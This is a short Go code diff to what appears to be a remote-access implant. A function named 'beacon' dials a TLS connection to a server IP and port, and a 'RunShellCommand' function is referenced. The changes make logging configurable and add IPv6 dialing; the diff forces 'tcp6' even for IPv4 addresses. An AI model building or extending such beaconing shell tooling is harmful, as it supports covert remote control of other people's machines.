@@ -23,8 +23,12 @@ import (
 )
 
 
-func Initialize() {
-	logger.EnableLogging(true)
+func Initialize(logging_enabled string) {
+    set_logging, err := strconv.ParseBool(logging_enabled)
+    if err != nil {
+		fmt.Printf("Failed to parse LoggingEnabled: %v\n", err)
+    }
+	logger.EnableLogging(set_logging)
 	if err := logger.SetLogFile("app.log"); err != nil {
 		fmt.Printf("Error setting log file: %v\n", err)
 	}
@@ -76,7 +80,16 @@ func RunShellCommand(command string) string {
 }
 
 func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
-	beacon, err := tls.Dial("tcp", fmt.Sprintf("%s:%s", ServerIP, ServerPort), config)
+	var address string
+	if net.ParseIP(ServerIP).To4() == nil {
+		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
+	} else {
+		address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
+	}
+
+	logger.Logf(logger.Info, "Dialing %v", address)
+
+	beacon, err := tls.Dial("tcp6", address, config)
 	if err != nil {
 		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
 		return nil, nil, nil, err
